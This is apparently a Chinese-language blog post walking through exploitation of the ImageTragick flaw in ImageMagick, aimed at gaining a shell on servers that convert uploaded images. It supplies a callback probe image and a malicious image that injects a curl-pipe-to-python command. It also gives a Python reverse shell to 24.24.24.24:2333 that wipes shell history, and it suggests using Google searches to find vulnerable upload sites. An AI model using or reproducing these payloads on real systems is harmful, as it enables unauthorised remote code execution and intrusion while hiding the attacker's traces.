---
layout : post
targs : code
premalink : pretty
---

写在最前面：关于漏洞的详细信息都在这儿： <https://imagetragick.com/> 加个https我估计也是为了嘲讽，醉。

话说我反应好慢。

刚测试成功了就尴尬了一回。

然后琢磨怎么getshell。

然后。

如下：

### 测试服务器是否存在漏洞：
创建一个文件，叫他 `e.png` 吧：

```bash
➜ cat e.png 
push graphic-context
viewbox 0 0 640 480
fill 'url(http://23.23.23.23:8000/)'
pop graphic-context
```

其中`23.23.23.23`是你的服务器IP，然后在上面开一个迷你的web服务器：`python -m SimpleHTTPServer`，默认端口就是8000，如果有其他业务在8000端口跑。还请加个端口参数（`python -m SimpleHTTPServer 8989`），记得上面的`e.png`也改一下。

在服务器上监听好了之后，就可以上传图片了，哦对了，首先做的应该是找一些能上传图片的站，比如，在线图片转换（Google Hacking）。

其实可以在本地先测试一下：`convert e.png o.jpg`，如果服务器那边有访问请求（GET），那就说明你本地是存在漏洞的。

然后如果你找到了一个可以上传图片并且可以执行代码的网站，那么恭喜你，下一步就可以测试getshell了。

### Getshell

利用执行命令这一点，可以做很多事，创建文件，删除文件，移动文件，乱七八糟，我只是利用了一个shell而已。

```bash
➜ cat psh.png 
push graphic-context
viewbox 0 0 640 480
fill 'url(https://1"||curl -sS http://23.23.23.23:8000/e.py | python")'
pop graphic-context
```

`http://23.23.23.23:8000/e.py`：

```bash
import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("24.24.24.24",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.unsetenv("HISTFILE");os.unsetenv("HISTFILESIZE");os.unsetenv("HISTSIZE");os.unsetenv("HISTORY");os.unsetenv("HISTSAVE");os.unsetenv("HISTZONE");os.unsetenv("HISTLOG");os.unsetenv("HISTCMD");os.putenv("HISTFILE","/dev/null");os.putenv("HISTSIZE","0");os.putenv("HISTFILESIZE","0");pty.spawn("/bin/sh");s.close()
```

然后要在 24.24.24.24 的 2333 端口监听反弹过来的shell：`nc -lp 2333`

把这个图片文件上传，然后在 23.23.23.23 开的那台小服务器上就会有get请求，然后，在24.24.24.24监听的2333端口上就会收到一个shell。

就这么神奇。

反弹shell的脚本来自于`google security team`, 网上也有很多，我只是把多余没用的东西去掉了，然后顺便删了一下空格。原来想着是直接写到`e.png`中的，可是因为里面有逗号，而这个漏洞虽然是漏洞但是还过滤了逗号，把逗号都转换成空格了，没办法，只能麻烦一步，用curl抓下来，用管道交给python，然后反弹shell。

其实这样做也比较优雅，比网上那些好看多了。

### 最后
拿到shell之后就是提权之类的了，不在此处讨论。

上一张服务器的图：

![mem](../img/s/imagemagick/1.png)

![net](../img/s/imagemagick/2.png)

